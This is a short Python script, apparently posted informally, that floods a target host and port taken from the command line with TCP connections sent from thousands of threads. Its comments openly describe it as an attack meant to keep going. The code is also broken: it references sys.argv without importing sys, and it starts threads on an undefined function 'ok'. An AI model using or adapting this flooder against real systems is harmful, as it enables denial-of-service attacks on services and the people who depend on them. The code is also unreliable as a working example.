# updated version
# credits to the professional socket programmer(mwah)
# might wanna lower the threads


import socket
from sys import argv
from threading import Thread
def send():
  while True:
    try:
      sock = socket.socket() #not including anything in the socket due to the fact that socket.socket defaults as a tcp socket
      sock.settimeout(1)
      sock.connect((sys.argv[1], int(sys.argv[2])))
      sock.send(b" ") #sending a low payload = faster packet sending
      sock.close()
    except: 
      pass #ignore any exceptions to keep the attack going
for i in range(9999): #might wanna make this lower LOL
  Thread(target=ok).start()
